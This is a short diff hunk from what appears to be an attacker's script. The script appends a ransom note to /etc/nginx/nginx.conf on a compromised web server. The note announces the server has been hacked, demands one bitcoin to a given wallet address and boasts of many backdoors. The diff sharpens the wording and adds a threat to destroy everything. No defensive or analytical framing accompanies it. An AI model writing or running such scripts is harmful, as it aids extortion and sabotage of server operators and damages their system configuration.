@@ -64,10 +64,12 @@ ATTENTION
 
 Your web server has been hacked!
 
-Please send 1 bitcoin to the address below:
+Send 1 bitcoin to the address below:
 1MCwBbhNGp5hRm5rC1Aims2YFRe2SXPYKt
 
 You will never be able to stop me! I have too many backdoors in your system.
+
+If you don't pay soon, I will destroy everything!3
 
 " >> /etc/nginx/nginx.conf
 
